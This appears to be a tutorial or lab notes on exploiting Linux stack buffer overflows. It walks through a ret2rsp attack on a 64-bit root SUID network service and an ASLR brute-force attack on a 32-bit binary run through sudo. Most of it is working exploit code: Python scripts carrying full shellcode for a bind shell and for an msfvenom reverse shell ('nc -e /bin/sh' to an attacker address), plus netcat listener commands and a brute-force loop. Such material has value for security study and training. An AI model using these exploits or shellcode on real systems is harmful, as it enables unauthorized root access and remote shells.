# Linux Stack Overflows

## Exploiting 64-bit SUID Executable Using Ret2RSP
In this example, a 64-bit root SUID executable has a buffer overflow vulnerability that allows an attacker to use the ret2rsp attack technique. The executable opens a socket on port 31337 and forks a process sending the input to the child process. The executable will fork the child process again in the event of a crash.

```bash
# Check if Address Space Layout Randomization (ASLR) is enabled; value of 1 or 2 means it's enabled
cat /proc/sys/kernel/randomize_va_space

# Check if the stack is executable; output will be returned if it's executable
readelf -W -l testbin | grep 'GNU_STACK' | grep 'RWE'
```

From the above commands, in this example, ASLR was enabled (2) and had an executable stack.

The next step is to determine the offset in the input that will allow RIP to be overwritten.

Using Metasploit's pattern_create to create a payload to find the offset.

```bash
# Create a payload with a length of 150 bytes
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 150 
```

Creating a Python script that will be used to send the payload.

```python
import socket

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(("localhost", 31337))

# Banner
sock.recv(1024)

# Metasploit payload
payload = (
 "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa"
 "8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6A"
 "b7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5"
 "Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad"
 "4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2A"
 "e3Ae4Ae5Ae6Ae7Ae8Ae9"
)

sock.send(str.encode(payload))
res = sock.recv(1024)
print(bytes.decode(res))
sock.close()
```

Using gdb on the executable to retrieve the address at the top of the stack when the child process segfaults.
```text
gdb -q testbin

(gdb) set follow-fork-mode child
(gdb) run
(gdb) i r
(gdb) x/wx $rsp
```

Getting the exact offset; in this example it returned 120.

```bash
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 150 -q 0x41306541
```

Updated Python script to test if we can control RIP.
```python
import socket

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(("localhost", 31337))

# Banner
sock.recv(1024)

offset = 120
rip = "\x42\x42\x42\x42\x42\x42"
payload = "\x41" * offset + rip

sock.send(str.encode(payload))
res = sock.recv(1024)
print(bytes.decode(res))
sock.close()
```

Running the script again showed a segfault showing RIP pointing to 0x0000424242424242. This confirmed we now have control of RIP.

The next steps are to find a memory address that points to the shellcode on the stack and shellcode that is 120 bytes or less.

A ROP gadget was found inside the executable using objdump. Using this address for RIP will point to the shellcode on the stack.

```bash
objdump -D testbin | grep call | grep rsp
```

The address returned was 400cfb.

The Python script was updated with the memory address and shellcode that worked against the executable to gain shell access.

```python
import socket

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(("localhost", 31337))

# Banner
sock.recv(1024)

offset = 120
# 400cfb: ff d4 callq *%rsp
# Order is reversed (little endian)
rip = b"\xfb\x0c\x40\x00\x00\x00\x00"
# https://www.exploit-db.com/exploits/39149/
shellcode = (
b"\x48\x31\xc0\x48\x31\xf6\x48\xf7\xe6"
b"\x6a\x02\x5f\xff\xc6\x6a\x29\x58\x0f"
b"\x05\x48\x97\x6a\x02\x66\xc7\x44\x24\x02"
b"\x11\x5c"
b"\x54\x5e\x52\x6a\x10\x5a\x6a\x31\x58"
b"\x0f\x05\x5e\x6a\x32\x58\x0f\x05\x6a"
b"\x2b\x58\x0f\x05\x49\x89\xc1\x6a\x03"
b"\x58\x0f\x05\x49\x87\xf9\x48\x31\xf6"
b"\x6a\x03\x5e\xff\xce\xb0\x21\x0f\x05"
b"\x75\xf8\x48\x31\xf6\x48\xf7\xe6\x66"
b"\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f"
b"\x73\x68\x53\x54\x5f\x6a\x3b\x58\x0f\x05"
)
# NOPs added before shellcode to pad to 120 bytes
payload = b"\x90" * (offset - len(shellcode)) + shellcode + rip

sock.send(b"%s\n" % payload)
sock.recv(1024)
sock.close()
```

To gain root shell the following commands were executed.

```bash
python3 exploit.py
nc localhost 4444
```

## Bypass ASLR By Bruteforcing 32-bit Executable
In this example, a 32-bit executable has a buffer overflow vulnerability that allows an attacker to use bruteforcing to gain shell access. The executable is executed using a shell script called invoke.sh and can only be run using the sudo command as the targeted user. The executable takes the input of the user and outputs it to the screen.

The invoke.sh script is shown below.

```bash
#!/bin/sh

while getopts "dte:h?" opt ; do
  case "$opt" in
    h|\?)
      printf "usage: %s -e KEY=VALUE prog [args...]\n" $(basename $0)
      exit 0
      ;;
    t)
      tty=1
      gdb=1
      ;;
    d)
      gdb=1
      ;;
    e)
      env=$OPTARG
      ;;
  esac
done

shift $(expr $OPTIND - 1)
prog=$(readlink -f $1)
shift
if [ -n "$gdb" ] ; then
  if [ -n "$tty" ]; then
    touch /tmp/gdb-debug-pty
    exec env - $env TERM=screen PWD=$PWD gdb -tty /tmp/gdb-debug-pty --args $prog "$@"
  else
    exec env - $env TERM=screen PWD=$PWD gdb --args $prog "$@"
  fi
else
  exec env - $env TERM=screen PWD=$PWD $prog "$@"
fi
```

Determined if ASLR was enabled.

```bash
# Check if Address Space Layout Randomization (ASLR) is enabled; value of 1 or 2 means it's enabled
cat /proc/sys/kernel/randomize_va_space
```

In this example, ASLR was enabled (2).

The next step is to determine the offset in the input that will allow EIP to be overwritten.

Using Metasploit's pattern_create to create a payload to find the offset.

```bash
# Create a payload with a length of 120 bytes
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 120 > /tmp/payload
```

Using gdb on the executable to retrieve the address when the process segfaults.

```text
sudo -u john /home/jane/invoke.sh -dt testbin

(gdb) run < /tmp/payload
```

The output of the segfault showed "0x31624130 in ?? ()." Using the address provided, the offset was able to be determined (32 bytes).

```bash
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 120 -q 0x31624130
```

Determined if we could control EIP.

```bash
python -c 'print "\x41"*32 + "\x42"*4 + "\x43"*200' > /tmp/payload
```

Running gdb again to verify we can control EIP. The first gdb commands used are to remove the LINES and COLUMNS environment variables as environment variables affect the stack.

```text
sudo -u john /home/jane/invoke.sh -dt testbin

(gdb) unset env LINES
(gdb) unset env COLUMNS
(gdb) show env
(gdb) run < /tmp/payload
(gdb) i r
(gdb) x/5s $esp
```

The output now shows EIP as 0x42424242. This confirms we have control of EIP. In addition, we grabbed the first ESP stack frame memory address and determined we can have shellcode that is 200 bytes (0xbffffe30: 'C' <repeats 200 times>).

A Python script was created to gain shell access using shellcode that was generated using Metasploit.

```python
import os

payload = "/tmp/payload"
# Address of ESP stack frame (little endian)
eip = "\x30\xfe\xff\xbf"

# msfvenom -p linux/x86/exec CMD="nc -e /bin/sh 192.168.1.5 1234" -f c -b "\x00\x0a\x0d"
# Shellcode size is 93 bytes
shellcode = ( 
  "\xda\xdd\xbb\xfa\x98\x4e\x39\xd9\x74\x24\xf4\x5d\x31\xc9\xb1"
  "\x11\x83\xed\xfc\x31\x5d\x15\x03\x5d\x15\x18\x6d\x24\x32\x84"
  "\x17\xeb\x22\x5c\x05\x6f\x22\x7b\x3d\x40\x47\xeb\xbe\xf6\x88"
  "\x89\xd7\x68\x5e\xae\x7a\x9d\x7f\x30\x7b\x5d\xee\x53\x5b\x70"
  "\x8b\xb3\xb4\xe8\x3a\xdd\xe5\x9f\xd4\x01\xcb\x66\x17\x6f\x1a"
  "\xaf\x6f\x41\x6d\xe1\xba\xbd\xbc\xcf\xf7\x89\xbe\x78\xab\x78"
  "\x5f\x4b\xcb"
)

offset = 32
sled = "\x90" * 100
junk = "\x41" * offset

with open(payload, 'w') as f:
   f.write(junk + eip + sled + shellcode)

# Bruteforce to gain shell access
while True:
   os.system("sudo -u john /home/jane/invoke.sh /home/jane/testbin < " + payload)
```

The msfvenom command needed to be run twice as the first generated payload failed when testing in gdb. A successful payload should show:

```text
(gdb) run < /tmp/payload
Starting program: /home/jane/testbin < /tmp/payload
process 6508 is executing new program: /bin/dash
[Inferior 1 (process 6508) exited with code 01]
```

To gain shell access for the target user, the following commands were run:

```bash
# On the attacker machine
nc -nvlp 1234

# Then run the script on the victim machine
python exploit.py
```

This method took a few minutes to gain shell. The exploit script will keep executing the program until the program stops segfaulting due to ASLR finally matching the EIP address in the script. This method should be used as a last resort as it's inefficient.